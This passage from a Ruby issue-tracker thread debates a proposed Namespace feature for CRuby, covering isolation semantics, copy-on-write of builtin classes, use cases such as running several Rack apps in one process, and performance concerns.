<p>In Ruby, objects are stored in constants. Conceptually, a constant <code>X</code> storing a string object and a constant <code>C</code> storing a class object are not fundamentally different. Do you mean namespace creation traverses constant trees, clones only the values that are class and module objects, and keeps the rest of object references, which become shared between namespaces?</p>
</blockquote>
<p>For example, <code>String</code> is a built-in class and <code>Class</code> object value, stored as <code>::String</code> constant. And in a namespace <code>ns1</code>, we can change <code>String</code> definition (for example, adding a constant <code>String::X = "x"</code>).<br>
But even in that case, the value of <code>String</code> is identical. <code>::String == ns1::String</code> returns true.</p>
<p>That means, the value (<code>VALUE</code> in CRuby world) is identical and not copied when namespaces are created, but the backed class definition (struct rb_classext_t) are different and those are the CoW target.</p>
<blockquote>
<p>Even in the case of classes and modules, what happens to the objects in their ivars?</p>
</blockquote>
<p>Class ivars (instance variable tables of classes) are copied, but the ivar values are not copied. It's similar to constants (constant tables) of classes.</p>
<blockquote>
<p>I do not know about builtin, but in the case of user-defined classes/modules, I don't think we can assume they do not mutate their state. We could have 2500 of them in the root namespace when the namespace is created.</p>
</blockquote>
<p>In the namespace context, "builtin classes/modules" are classes and modules defined before any user-script evaluation. (I'll update the ticket description soon.)<br>
The total number of those are, classes 685, modules 40 (and internal iclass 51). any user-defined classes/modules are not defined in the root namespace.</p></div>
  
  <div id="change-112909">
    
    

    <ul>
       <li><strong>Description</strong> updated (<a title="View differences" href="https://bugs.ruby-lang.org/journals/112909/diff?detail_id=69493">diff</a>)</li>
    </ul>
    
    </div>
  
  <div id="change-112911"><blockquote>
<p>any user-defined classes/modules are not defined in the root namespace.</p>
</blockquote>
<p>Ah, that is key.</p>
<p>So, what happens in this script?</p>
<pre><code data-language="ruby"><span># main.rb</span>

<span>App</span> <span>=</span> <span>Class</span><span>.</span><span>new</span>

<span>ns1</span> <span>=</span> <span>Namespace</span><span>.</span><span>new</span>
<span>ns1</span><span>.</span><span>require</span><span>(</span><span>"./app1"</span><span>)</span> <span># defines/reopens App</span>
</code></pre>
<p>do <code>App</code> and <code>ns1::App</code> have the same object ID?</p>
<p>Or does the feature assume that if you want to isolate things that has to be the first thing before creating any constant, global variable, etc.?</p></div>
  
  <div id="change-112912"><blockquote>
<p>having a block parameter on Namespace.new could provide similar UX without changing syntax.</p>
</blockquote>
<p>That wouldn't handle constant definitions correctly though. Similar to how people get tricked by <code>Struct.new do</code> today.</p>
<pre><code data-language="ruby"><span>Foo</span> <span>=</span> <span>Struct</span><span>.</span><span>new</span><span>(</span><span>:bar</span><span>)</span> <span>do</span>
  <span>BAZ</span> <span>=</span> <span>1</span> <span># This is Object::BAZ</span>
<span>end</span>
</code></pre>
<p>That's why I filed [Feature <a title="Feature: Allow `class <constant-path> = <expression>` syntax (Rejected)" href="https://bugs.ruby-lang.org/issues/20993">#20993</a>], it would allow you to do:</p>
<pre><code data-language="ruby"><span>module</span> <span>MyNamespace</span> <span>=</span> <span>Namespace</span><span>.</span><span>new</span>
  <span>BAZ</span> <span>=</span> <span>1</span> <span># This is MyNamespace::BAZ</span>
<span>end</span>
</code></pre></div>
  
  <div id="change-112914">
    
    

    <p>@fxn The main and user namespaces are independent, though the main namespace can refer to user namespace via <code>ns::SomeConstant</code>.<br>
So the <code>App</code> from <code>main</code> here is inaccessible in <code>ns1</code>, in fact all constants defined in the main namespace are inaccessible in user namespaces, see the end of <a href="https://bugs.ruby-lang.org/issues/21311#User-namespace">https://bugs.ruby-lang.org/issues/21311#User-namespace</a>.</p>
    </div>
  
  <div id="change-112915"><p>I think this addresses <a href="https://bugs.ruby-lang.org/issues/19744#note-74">https://bugs.ruby-lang.org/issues/19744#note-74</a> by having a CoW copy of all builtin classes/modules in each namespace (including main namespace), nice.<br>
From a quick read it sounds correct to me.<br>
The semantics might be somewhat surprising in practice:</p>
<ul>
<li>e.g. String#start_with? is available in all namespaces but <code>String#to_time</code> is only available in the namespaces that load activesupport (clear if you know which methods are core but as we have seen from polls it is not always clear)</li>
<li>core classes&amp;modules are copy-on-write and shared references, but user-defined classes&amp;modules are completely separate (except main namespace can reference anything from other namespace explicitly through <code>ns::Foo</code> and even store them), it's kind of a dual situation and a bit inconsistent. I think it's necessary semantically though, as a String from another namespace should still be <code>obj.is_a?(String)</code>.</li>
<li>Any user-defined class instance won't be <code>is_a?</code> in another namespace and this might be particularly confusing for stdlib/default gems/bundled gems, e.g. a Date or Pathname created in <code>ns1</code> won't be <code>is_a?(Date)</code> in <code>main</code>, e.g. <code>ns1::TODAY.is_a?(Date) # =&gt; false</code> or <code>ns1::Date.today # =&gt; false</code>. Also <code>Pathname('/') == ns1::Pathname('/') # =&gt; false</code>. (all these examples run in the <code>main</code> namespace)</li>
</ul>
<p>For the last point I suspect one might need a way to transition objects from a namespace to another somehow, which sounds hard.<br>
Unless they truly need no communication at all between namespaces, but then different processes (or multiple interpreters in a process) might be a better trade-off (notably can run in parallel and stronger isolation).</p></div>
  
  <div id="change-112916"><p>While I believe namespaces would be a good addition to Ruby, I'm not convinced this particular implementation of<br>
namespaces is what Ruby needs.</p>
<p>First, I'm not convinced by the motivations:</p>
<blockquote>
<p>Avoiding name conflicts between libraries: Applications can require two different libraries safely which use the same module name.</p>
</blockquote>
<p>Is this a problem that happens on a regular basis? I believe Ruby has a pretty well established convention<br>
for libraries to expose a single module with a name that correspond to their gem name.</p>
<p>Actual top level module name clashes are extremely rare in my experience.</p>
<blockquote>
<p>Avoiding unexpected globally shared modules/objects</p>
</blockquote>
<p>Here again, from my experience this is very rare, and usually accepted as a bug, and promptly fixed.</p>
<p>Do we have concrete cases of this being a peristent problem?</p>
<blockquote>
<p>Multiple versions of gems can be required</p>
</blockquote>
<p>I remember there was discussions about this in the past. Personally this is a feature it's quite strongly<br>
against because it's extremely hard to reason about.</p>
<p>If you have library A using the gem G in version 1, and library B using the gem G in version 2,<br>
and end up with A being passed a G-v2 object, you may end up in a world of hurt.</p>
<p>I understand this feature would be useful for bundler specifically to allow them to use gems internally<br>
without conflicting with the application (a problem they currently solve by vendoring), but outside<br>
of that I'm not convinced it's a desirable feature.</p>
<p>I get that it can happen that you end up in a sticky situation with two dependencies being essentially<br>
incompatible because they require conflicting versions of another dependency, as it happened with the Faraday 2<br>
transition a few years back, but I'm not convinced that working around the problem that way is a net positive.</p>
<blockquote>
<p>Namespace monkey patches</p>
</blockquote>
<p>This one isn't in your ticket, but from previous public talks I understand it is one?</p>
<p>Here again I'd like to question how big of a problem monkey patches really are.<br>
It is true that 15 years ago, numerous popular gems would irresponsibly monkey patch core classes,<br>
but I believe these days are long gone. Except for ActiveSupport (that gets a pass for being a framework)<br>
very few gems ship with monkey patch.</p>
<p>A notable exception being "protocol" type of methods, such as <code>to_json</code>, <code>to_yaml</code>, <code>to_msgpack</code>, etc.</p>
<p>In addition, I routinely use monkey patches to backport a fix onto a gem while waiting for a fix to be merged<br>
and published upstream. If monkey patches became scoped to namespaces, this would make this sort of "monkey patches"<br>
way harder. So to me it's net negative.</p>
<blockquote>
<p>Being able to namespace existing code</p>
</blockquote>
<p>Again not listed in your motivations, but you explain pretty well that you want to be able to load arbitrary code<br>
into a namespace, because you don't want to have to modify the existing libraries.</p>
<p>It makes sense, but is it really that big of a need? I personally see namespaces as a feature libraries can<br>
use to write more robust and isolated code. Not as a feature applications can use to workaround libraries.</p>
<h2>Other issues<a href="#Other-issues">¶</a></h2>
<h3>Deduplication<a href="#Deduplication">¶</a></h3>
<p>Assuming this implementation of namespaces become largely used, it means some versions of some libraries would<br>
be loaded dozens and dozens of time in the same process. IIRC in some previous public talks you mentioned<br>
the possibility of deduplication, what's the status on this? Because without it, it's a big concern to me.</p>
<p>With Python/Java/Node namespacing systems it's an easily solved problem, because the file is essentially a<br>
namespace objects, so you can just keep a map of <code>file -&gt; namespace_object</code>, but here it seems way more involved.</p>
<h2>What I think would be a positive<a href="#What-I-think-would-be-a-positive">¶</a></h2>
<p>In order to not just be negative, I'll try to explain what I think would be helpful.</p>
<h3>Local namespace<a href="#Local-namespace">¶</a></h3>
<p>A common complaint I hear from less experienced / occasional Ruby users is they are having trouble figuring out where constants are comming from,<br>
because of the single global namespace.<br>
They prefer the Java/Python/Node style, where each file is more or less its own namespace, and at the top<br>
of the file you list your imports.</p>
<p>I think translated in Ruby, it could be emulated by only allowing to reference constants from outside the namespace<br>
in a fully qualified way:</p>
<pre><code data-language="ruby"><span>class</span> <span>SomeClass</span>
<span>end</span>

<span>namespace</span> <span>MyLibrary</span>
  <span>p</span> <span>SomeClass</span> <span># NameError</span>

  <span>SomeClass</span> <span>=</span> <span>::</span><span>SomeClass</span> <span># This is basically an import</span>

  <span>p</span> <span>SomeClass</span> <span># works</span>
<span>end</span>
</code></pre>
<p>In other word, I think namespaces could be somewhat similar to <code>BasicObject</code> but for modules.</p>
<h2>Overly public constants<a href="#Overly-public-constants">¶</a></h2>
<p>Another common issue I witnessed is publicly exposed constants, that aren't meant to be public.</p>
<p>Being involved in a really big application, what people are trying to do to make that codebase more manageable<br>
is to break it down in smaller components with the hope that a developer can more easily wrap their head around<br>
a single component, that a component can be tested individually, etc.</p>
<p>This often fall appart because all constants are public by default, so other teams end up relying on APIs that<br>
weren't meant to be used.</p>
<p>I think it would be helpful if namespaces constants were private by default and you had to explictly "export" (publicize)<br>
them.</p></div>
  
  <div id="change-112917"><p>(from description)</p>
<blockquote>
<p>There is no way to access App in the main namespace from the code in the different namespace ns.</p>
</blockquote>
<p>Right, although of course the main namespace can do <code>ns1::MainApp = App</code> and expose its class like that.</p>
<p>I wonder if there should be a way to get the Namespace object of the main namespace.<br>
Then the main and user namespaces wouldn't have any difference besides the main namespace beind the default/starting namespace, as if the main script was executed under <code>main_ns = Namespace.new; main_ns.require(main_script)</code>.</p></div>
  
  <div id="change-112918"><p>Has the performance of Namespace been evaluated?<br>
I would assume getting the current namespace to execute methods/procs is an overhead (the namespace is at least needed for constant accesses and for method lookup on builtin classes).</p>
<p>At least any shared code (so probably only methods/procs from the root namespace) doing constant lookup is likely slower as it needs to lookup from the current namespace / from the correct <code>struct rb_classext_t</code>.<br>
Are constant inline caches disabled for such methods, if not how does it work and avoid invalidating those caches?</p>
<p>Same for method lookup on builtin classes, what about method lookup inline caches for method calls inside root namespace methods/procs?</p></div>
  
  <div id="change-112919"><p><a href="https://bugs.ruby-lang.org/users/7941">@byroot (Jean Boussier)</a> makes a good point about use cases, I share the same concerns (and already did in <a href="https://bugs.ruby-lang.org/issues/19744#note-21">https://bugs.ruby-lang.org/issues/19744#note-21</a> a while ago).<br>
It seems easy to avoid these problems and these problems don't seem to come up frequently either.<br>
I'm not sure adding such a big feature for these seemingly rather-niche issues is worth it.</p>
<p>From TruffleRuby's POV I am unsure it makes to implement Namespace there, when there is <a href="https://bugs.ruby-lang.org/issues/19744#note-21">stronger isolation</a> already available, more performant and with simpler semantics.</p></div>
  
  <div id="change-112921">
    
    

    <ul>
       <li><strong>Related to</strong> <i><a href="https://bugs.ruby-lang.org/issues/19744">Feature #19744</a>: Namespace on read</i> added</li>
    </ul>
    
    </div>
  
  <div id="change-112922"><blockquote>
<p>The main and user namespaces are independent</p>
</blockquote>
<p><a href="https://bugs.ruby-lang.org/users/772">@Eregon (Benoit Daloze)</a> the description says</p>
<blockquote>
<p>User namespace is a namespace to run users' Ruby scripts. The "main" namespace is the namespace to run the user's .rb script specified by the ruby command-line argument. Other user namespaces ("optional" namespaces) can be created by Namespace.new call.</p>
</blockquote>
<p>The vocabulary is not very clear to me. What is a "script", is <code>active_record.rb</code> a script? If "User namespace is a namespace to run users' Ruby scripts" and also "The "main" namespace is the namespace to run the user's .rb script specified by the ruby command-line argument.", is main a user namespace?</p>
<p>I find the description also a bit hard to follow at times because it conflates constants and the objects they store. Classes and modules are value objects like any other value object. For example, they are not top-level or not top-level, <strong>constants</strong> that belong to <code>Object</code> are top-level. In some cases I can translate to what seems to be the intention, but to describe a feature like this I think it would be more clear that we are technically sharp.</p>
<p>I also see the concerns raised by <a href="https://bugs.ruby-lang.org/users/7941">@byroot (Jean Boussier)</a>.</p></div>
  
  <div id="change-112923"><p>byroot (Jean Boussier) wrote in <a href="#note-13">#note-13</a>:</p>
<blockquote>
<p>I personally see namespaces as a feature libraries can use to write more robust and isolated code. Not as a feature applications can use to workaround libraries.</p>
</blockquote>
<p>It's not about "working around" libraries. It's about loading entirely different and independent apps within the same process. All the motivations presented above are in service of that. Imagine a basic router that accepts requests and routes them to 2 namespaced apps A and B. A is a Rails 6 app, B is a Rails 7 app. Completely different worlds that do not ever interact so "end up with A being passed a G-v2 object" is not an issue in practice.</p>
<p>The 2 apps <em>could</em> be run as separate processes, but</p>
<ol>
<li>The routing would have to be handled by something else (nginx?) and much less flexible than ruby</li>
<li>Concurrency is harder to control; if you want a limit of 10 concurrent requests, then you need 10 processes each of A and B, plus some external synchronization to ensure that of those 20 processes only 10 are ever active at one time.</li>
</ol>
<p>I'm not sure if this can be achieved with TruffleRuby sub-interpreters or how you would go about it.</p></div>
  
  <div id="change-112924"><p>My interpretation of the vocabulary is as following:</p>
<ol>
<li>The interpreter boots in a <code>root</code> namespace.</li>
<li>The "state" when this process ends is somehow snapshotted into <code>S</code> or something, conceptually (plenty of details here, but I am talking only about the vocabulary).</li>
<li>Any other namespace is a <em>user</em> namespace. This is a concept, not a name.</li>
<li>When the interpreter starts interpreting "external" code, it creates a user namespace called <code>main</code>, and initializes it with <code>S</code>.</li>
<li>If the code in <code>main</code> spawns other namespaces, they are also user namespaces, and are initialized with <code>S</code> (for example, the constants and global variables in <code>main</code> are not inherited. In particular, the arrays stored in <code>$LOADED_FEATURES</code>, <code>$LOAD_PATH</code>, etc. are new array references whose initial items are as in <code>root</code>).</li>
<li>Such optional namespaces can in turn spawn namespaces, and they are initialized with <code>S</code> too.</li>
</ol>
<p>So, I <em>guess</em> spawning does not create hierarchy. A namespace may not have a pointer to the namespace where it was born (or I don't see the need for it after creation). It is conceptually just one flat layer of independent user namespaces.</p>
<p>Is that a good model?</p>
<p><a href="https://bugs.ruby-lang.org/users/1855">@tagomoris (Satoshi Tagomori)</a> is that correct?</p></div>
  
  <div id="change-112925"><p>If my interpretation is correct, the entry point of a library will be executed as many times as user namespaces require it, in the same operating system process.</p>
<p>That is a potential gotcha to have in mind too, since nowadays you can kind of assume that you'll be loaded at most once in the same process, and you may leverage that to run one-offs. With namespaces, you'd need to be idempotent by hand.</p></div>
  
  <div id="change-112926"><p>Dan0042 (Daniel DeLorme) wrote in <a href="#note-19">#note-19</a>:</p>
<blockquote>
<p>It's not about "working around" libraries. It's about loading entirely different and independent apps within the same process.</p>
</blockquote>
<p>So that's not something I understood for the issue description. But if that's so, while I understand the appeal and see how it would be nice to have, I don't think it's useful enough to justify such a massive impact on the VM implementation. But that's just my opinion.</p></div>
  
  <div id="change-112927"><p>byroot (Jean Boussier) wrote in <a href="#note-13">#note-13</a>:</p>
<blockquote>
<blockquote>
<p>Avoiding name conflicts between libraries: Applications can require two different libraries safely which use the same module name.</p>
</blockquote>
<p>Is this a problem that happens on a regular basis? I believe Ruby has a pretty well established convention<br>
for libraries to expose a single module with a name that correspond to their gem name.</p>
</blockquote>
<p>One use case for this is to benchmark libraries that do the same thing against each other.  Very frequently libraries doing the same thing are forks of each other, and just as frequently are not re-namespaced.</p>
<p>As a concrete example, the <code>memo_wise</code> gem does this type of benchmarking, against all the other known "memoization" gems, including pitting its own latest release against its own unreleased HEAD. As a result there are many shared namespaces.  This allows them to see if their changes are beneficial.</p>
<p>I wrote a tool in my gem <code>gem_bench</code> to assist them in that benchmarking.  It loads a gem, and re-namespaces it, in a terrible, dirty, hacky way.  It only works due to the relative simplicity of the libraries, and would not work in more complex cases.  And that is the point I'm making here...</p>
<p>It isn't done much because it is damn hard to do.  But it might be done more if we could easily load a bunch of otherwise conflicting tools and run them all at the same time.  The benchmarking memo_wise has created from this is pretty cool.  There are currently multiple open related pull requests, and we're actively working on it.</p>
<ul>
<li><a href="https://github.com/panorama-ed/memo_wise/pulls">https://github.com/panorama-ed/memo_wise/pulls</a></li>
<li><a href="https://github.com/panorama-ed/memo_wise?tab=readme-ov-file#benchmarks">https://github.com/panorama-ed/memo_wise?tab=readme-ov-file#benchmarks</a></li>
<li><a href="https://github.com/pboling/gem_bench">https://github.com/pboling/gem_bench</a></li>
</ul></div>
  
  <div id="change-112928"><p>peter.boling (Peter Boling) wrote in <a href="#note-23">#note-23</a>:</p>
<blockquote>
<p>One use case for this is to benchmark libraries that do the same thing against each other.  Very frequently libraries doing the same thing are forks of each other, and just as frequently are not re-namespaced.</p>
</blockquote>
<p>I know it's going to read like I'm moving the goal post, but "very frequently" seem way too strong of a term here. This is rather rare.</p>
<p>But yes, benchmarking is indeed one use case. I myself often benchmark different versions of a single gem, for optimization purposes and this feature could be handy, but it's not like I can't do it today, and also <code>benchmark-ips</code> has the <code>hold!</code> and <code>save!</code> feature for exactly that purpose.</p>
<p>So I still think this is way too situational of a use case to justify such a massive change in the VM.</p>
<p>Because to me, in the end it's really about usefulness vs added implementation complexity.</p>
<p>Given the complexity of the implementation, I think it's very hard to justify unless it's envisioned as something that will be very largely adopted. You don't add 6k lines of C in the VM, and many extra indirections in performance sensitive codepaths just to make benchmarking a bit easier once in a while.</p>
<p>But perhaps this feature as designed would end up very useful and very used, I might just not see it yet. But I'd like to hear about common green path, day to day, use cases, not fringe needs.</p></div>
  
  <div id="change-112929"><p>Agreed on all points.  I have little concept of the complexity of the implementation, and defer to you on that.  I think there is value in considering that we can't entirely know how it might be used since we don't have it yet, and that it is a very powerful idea.  The concurrent applications with a total request limit is an an interesting use case.</p>
<p>Dan0042 (Daniel DeLorme) wrote in <a href="#note-19">#note-19</a>:</p>
<blockquote>
<p>Imagine a basic router that accepts requests and routes them to 2 namespaced apps A and B. A is a Rails 6 app, B is a Rails 7 app</p>
</blockquote>
<p>Another potential use case is tools that dogfood themselves.  I have a gem, kettle-soup-cover, a code coverage meta gem, which does a lot of work to remove constants, and reload files, so it can use itself while testing itself, getting code coverage on itself from itself.  I had planned to release the code I'm using to manage this mess as a separate gem, because I see myself using it in other places.  I've had to do the same thing multiple times in the past, and would prefer to have the solution library-fied and tested.</p>
<p>If I could load a version of the gem into a different namespace it would make the setup simpler.</p>
<ul>
<li><a href="https://github.com/kettle-rb/kettle-soup-cover/blob/main/lib/kettle/change.rb">https://github.com/kettle-rb/kettle-soup-cover/blob/main/lib/kettle/change.rb</a></li>
</ul></div>
  
  
  
  <div id="change-112942"><p>I have compiled the branch and I am playing around a bit with <code>miniruby</code> to test my understanding of the feature.</p>
<p>Something that has caught my attention is that class and module names do not return constant paths. That is, the following snippet</p>
<pre><code data-language="ruby"><span>A</span> <span>=</span> <span>Class</span><span>.</span><span>new</span>
<span>puts</span> <span>A</span><span>.</span><span>name</span>
</code></pre>
<p>would print <code>A</code> normally, and something like <code>#&lt;Namespace:0x00000001009ef510&gt;::A</code> in a namespace.</p>
<p>I believe this proposal is more transparent than the previous one. However, the namespace is still not quite transparent.</p>
<p>You'd like that the gem being loaded "in a namespace" works as if it was in the main namespace. As it would happen in a subprocess forked at the start of the entrypoint. But, intuitively, I think it is going to be hard to achieve that level of isolation without introducing a new entity in the language with its own new set of rules.</p></div>
  
  <div id="change-112945"><p>I'm sorry that I skipped to make effort to describe the motivation and copied the motivation section from the past ticket (and it was not well described enough).<br>
Let me explain the motivation in detail. I had some mixed points below:</p>
<h3>Being able to namespace existing code and libraries<a href="#Being-able-to-namespace-existing-code-and-libraries">¶</a></h3>
<p>By using namespace, we can mount two, or more, dozens of different Rack applications on a Rack app server.<br>
The use cases of this feature are:</p>
<ul>
<li>Mounting server-less applications (run on AWS Lambda, separated on processes in production) on a single app server for development
<ul>
<li>Apps may have conflicting classes (like <code>User</code>)</li>
<li>Apps may have conflicting dependencies</li>
<li>Apps need to load different set of environment variables</li>
<li>(This is my original motivation to development namespace)</li>
</ul>
</li>
<li>Mounting two different revisions of an application for useful deployments (older and newer commits of an app)
<ul>
<li>App server can implement in-process blue-green deployment</li>
<li>App server can check diffs of responses of two revisions from a (duplicated) request</li>
<li>App server can compare response time of two revisions from a (duplicated) request</li>
</ul>
</li>
<li>Mounting two different set of dependency versions of an application
<ul>
<li>This is a kind of blue-green deployments, but for dependencies without any app code diffs</li>
</ul>
</li>
</ul>
<p>The first one is to update my app server LFA (<a href="https://github.com/tagomoris/LFA">https://github.com/tagomoris/LFA</a>). And I believe I would be very positive to try implementation of the second/third one if I were maintaining web apps written in Ruby.</p>
<h3>Avoiding unexpected globally shared modules/objects<a href="#Avoiding-unexpected-globally-shared-modulesobjects">¶</a></h3>
<p>My case of this is Fluentd and Oj. Oj has a global set of configuration <code>Oj.default_options</code>. It can be set from anywhere, and it can break the behavior globally.<br>
Many of Fluentd plugins use Oj, and the behavior of Oj may be changed by options set by different plugins.<br>
It seems a kind of bug and should not happen, but Oj still doesn't have per-instance configuration APIs.</p>
<h3>Multiple versions of gems can be required<a href="#Multiple-versions-of-gems-can-be-required">¶</a></h3>
<p>Fluentd too. Plugins are different and independent software developed by many different maintainers, having different sets of dependencies, but those plugins can be loaded on a Fluentd process.<br>
In my opinion, any other software having plugin systems should have same problem potentially.</p>
<h3>Namespace monkey patches<a href="#Namespace-monkey-patches">¶</a></h3>
<p>It may not happen frequently now, but potentially happens, and (in my opinion) it prevents us to implement Ruby core feature in Ruby.<br>
I'm unsure how it actually prevents Ruby committers, but if built-in Ruby code are protected from monkey patches by namespace, we can implement many things in Ruby.</p>
<p>For example, require/load mechanism is implemented in C, but most of those code are just doing path construction (string operations) and file system accesses. It's really obvious that Ruby is much better language than C in such purpose. And now, it can be JIT-ed!</p>
<p>I'm really unsure how monkey patch risk prevents committers to do those things, so this section can be ignorable :P</p></div>
  
  <div id="change-112946"><p>@fxn</p>
<blockquote>
<p>So, I guess spawning does not create hierarchy. A namespace may not have a pointer to the namespace where it was born (or I don't see the need for it after creation). It is conceptually just one flat layer of independent user namespaces.</p>
<p>Is that a good model?</p>
<p><a href="https://bugs.ruby-lang.org/users/1855">@tagomoris (Satoshi Tagomori)</a> (Satoshi Tagomori) is that correct?</p>
</blockquote>
<p>Correct.</p>
<blockquote>
<p>If my interpretation is correct, the entry point of a library will be executed as many times as user namespaces require it, in the same operating system process.<br>
That is a potential gotcha to have in mind too, since nowadays you can kind of assume that you'll be loaded at most once in the same process, and you may leverage that to run one-offs. With namespaces, you'd need to be idempotent by hand.</p>
</blockquote>
<p>There should be no needs for library developers to consider such things.<br>
Namespace is designed to isolate side effects of "the entry point of a library" (except for some cases like modifying ENV). If a library uses class variables or global variables, these are separated by namespace. If a library uses class instance variables, class instances are different between namespaces.<br>
What can you imagine other things changed in library entry points?</p>
<blockquote>
<p>That is, the following snippet<br>
A = Class.new<br>
puts A.name<br>
would print A normally, and something like #<a href="namespace:0x00000001009ef510">Namespace:0x00000001009ef510</a>::A in a namespace.</p>
</blockquote>
<p>This depends on how we implement the classpath. Currently, in my opinion, it should NOT consider the current context namespace and always return classpath with namespace (like <code>#&lt;Namespace:0x00000001009ef510&gt;::A</code>). But it can be changed and it can show just <code>A</code> in the namespace.</p></div>
  
  <div id="change-112947"><p>Thank you for expanding on the motivation, the design makes more sense to me now.</p>
<p>I'm still not convinced the tradeoff is worth it, but at least it makes sense.</p>
<p>Out of curiosity, have to ran the <code>yjit-bench</code> suite? I know it's a preview, but I wonder what the overhead currently is.</p></div>
  
  <div id="change-112948"><p>byroot (Jean Boussier) wrote in <a href="#note-24">#note-24</a>:</p>
<blockquote>
<p>But I'd like to hear about common green path, day to day, use cases, not fringe needs.</p>
</blockquote>
<p>Just was reminded of another gem I wrote that utilizes this pattern.</p>
<p>I use it two ways.</p>
<ol>
<li>
<p>When I am writing a library that provides functionality to a Rails Model, but I don't need to test against an entire Rails app.  I can mixin the functionality from the gem, and test it with an anonymous active record.</p>
</li>
<li>
<p>Inside a Rails app when I want to test a concern of the app in a vanilla model without setting up a real table in the actual test DB (as it uses a discrete sqlite inmemory DB).  This helps me prove a concern works as intended, and that interference from elsewhere is breaking the behavior.  For me this is a very common use case.</p>
</li>
</ol>
<p><a href="https://rubygems.org/gems/anonymous_active_record">https://rubygems.org/gems/anonymous_active_record</a></p>
<p>In point of fact, the models created by this gem are not actually anonymous, because <code>Class.new(ActiveRecord::Base)</code> hasn't worked for a long time.  I'm not sure if this proposal would work given that, but if I have time I want to test the theory.</p></div>
  
  <div id="change-112949"><p><a href="https://bugs.ruby-lang.org/users/1855">@tagomoris (Satoshi Tagomori)</a> thanks for your replies, even more with such a busy thread :). Let me followup:</p>
<blockquote>
<p>There should be no needs for library developers to consider such things.<br>
Namespace is designed to isolate side effects of "the entry point of a library" (except for some cases like modifying ENV). If a library uses class variables or global variables, these are separated by namespace. If a library uses class instance variables, class instances are different between namespaces.<br>
What can you imagine other things changed in library entry points?</p>
</blockquote>
<p>This is more of a technical concern. It falls in the category of "which things do we assume today that would no longer hold with the new feature". Since $LOADED_FEATURES is as it was in the root namespace, not just the entrypoint, but all the required files of the namespaced code (maybe required by itself recursively) are going to be executed as many times as user namespaces load that entrypoint.</p>
<p>OK, generally, that happens once today.</p>
<p>So the difference would matter if those files have side-effects like writing to the file system, forking, writing to a database, subscribe to Kafka topics, or anything of that sort that escapes Ruby.</p>
<blockquote>
<p>This depends on how we implement the classpath. Currently, in my opinion, it should NOT consider the current context namespace and always return classpath with namespace (like #<a href="namespace:0x00000001009ef510">Namespace:0x00000001009ef510</a>::A). But it can be changed and it can show just A in the namespace.</p>
</blockquote>
<p>Something I have in mind there (but probably not the only thing) is that there is a lot of code out there that passes <code>klass.name</code> around to be later <code>const_get</code>ted. That <code>klass.name</code> string could even be written in external storage to be later constantized by a different process.</p></div>
  
  <div id="change-112950"><p>Dan0042 (Daniel DeLorme) wrote in <a href="#note-19">#note-19</a>:</p>
<blockquote>
<p>I'm not sure if this can be achieved with TruffleRuby sub-interpreters or how you would go about it.</p>
</blockquote>
<p>It's easy with sub-interpreters, you would create a sub-interpreter instead of a namespace per app.<br>
Contrary to namespaces, sub-interpreters do not inherit any state from the initial interpreter, they're just "a clean new interpreter".<br>
At least with TruffleRuby sub-interpreters it's possible to pass objects between sub-interpreters, this works by passing a proxy, if any method is called on the proxy, it's executed in the sub-interpreter owning that object.<br>
So you can pass strings or requests objects or whatever from the router to the apps.</p></div>
  
  <div id="change-112951"><p>Eregon (Benoit Daloze) wrote in <a href="#note-12">#note-12</a>:</p>
<blockquote>
<ul>
<li>Any user-defined class instance won't be <code>is_a?</code> in another namespace and this might be particularly confusing for stdlib/default gems/bundled gems, e.g. a Date or Pathname created in <code>ns1</code> won't be <code>is_a?(Date)</code> in <code>main</code>, e.g. <code>ns1::TODAY.is_a?(Date) # =&gt; false</code> or <code>ns1::Date.today # =&gt; false</code>. Also <code>Pathname('/') == ns1::Pathname('/') # =&gt; false</code>. (all these examples run in the <code>main</code> namespace)</li>
</ul>
<p>For the last point I suspect one might need a way to transition objects from a namespace to another somehow, which sounds hard.<br>
Unless they truly need to communication at all between namespaces, but then different processes (or multiple interpreters in a process) might be a better trade-off (notably can run in parallel and stronger isolation).</p>
</blockquote>
<p>I don't think it's a good idea to support communication between namespaces.  You could get in to a situation where you load 2 incompatible versions of the same library, allocate an object in one version, then pass the object to a second version.  <code>is_a?</code> checks could pass, but the shape of the data is wrong.  I've heard this is a problem in Node.JS which already supports loading multiple versions of one library (though probably not a super common problem).</p></div>
  
  <div id="change-112952"><p>Aaron that is a concern I have also in mind that I have not expressed yer.</p>
<p>The current proposal allows access to the user namespaces from the creating one  And believe some use cases in this thread re dogfood need that communication.</p>
<p>But I think that'd leak in several ways. One of them allowing an arbitrary number of class and module names from having the same permanent name if set from the outside.</p></div>
  
  <div id="change-112954"><p>tagomoris (Satoshi Tagomori) wrote:</p>
<blockquote>
<p>Root namespace is a unique namespace to be defined when a Ruby process starts. It only contains built-in classes/modules/constants, which are available without any <code>require</code> calls, including RubyGems itself (when <code>--disable-gems</code> is not specified).</p>
</blockquote>
<p>RubyGems has a lot of state and is a non-trivial amount of code.<br>
It's very likely not safe to share that between namespaces, e.g., the list of loaded gems, which should be per-namespace and not per-process.<br>
Basically any state (which is any mutable object, excluding modules and classes which are basically CoW by namespaces, but not the contents of their constants, @ivars, @@cvars) in the root namespace is leaking between namespaces.</p>
<blockquote>
<p>What can you imagine other things changed in library entry points?</p>
</blockquote>
<p>What @fxn said and in addition I recall some cases where a native function needs to be called once per process and not more.<br>
Now given C extensions are loaded once per namespace that may be fine in some cases, but probably isn't in other cases where it's touching truly-process-global state, or state escaping the process.</p>
<blockquote>
<p>I'm really unsure how monkey patch risk prevents committers to do those things, so this section can be ignorable :P</p>
</blockquote>
<p>I guess the main thing is if some core method is implemented in Ruby, it needs to be careful when calling methods, e.g. if it calls <code>if argument.is_a?(Integer)</code>, <code>is_a?</code> can be overwritten.<br>
<code>Primitive</code> are already the solution for such cases and work well, with even less overhead than a regular method call, so I don't think this is a particularly good use-case for namespaces.</p>
<blockquote>
<p>For example, require/load mechanism is implemented in C, but most of those code are just doing path construction (string operations) and file system accesses. It's really obvious that Ruby is much better language than C in such purpose. And now, it can be JIT-ed!</p>
</blockquote>
<p>FWIW TruffleRuby does implement <a href="https://github.com/oracle/truffleruby/blob/241afc956a8a5cf817c200590da93441d7a253d0/src/main/ruby/truffleruby/core/truffle/feature_loader.rb">significant parts of require/load in Ruby</a>, including the $LOADED_FEATURES cache.<br>
Ruby code is certainly more readable than C code, but it also has warmup cost and require/load is done early so very warmup-sensitive.<br>
I don't believe JITing such code with YJIT would be faster than the C implementation of it.<br>
Using Ruby means a lot of extra abstractions compared to C, and that's not free.<br>
Even TruffleRuby does not run Ruby code as fast as equivalent C code (it's strictly impossible in general due to the richer Ruby semantics).<br>
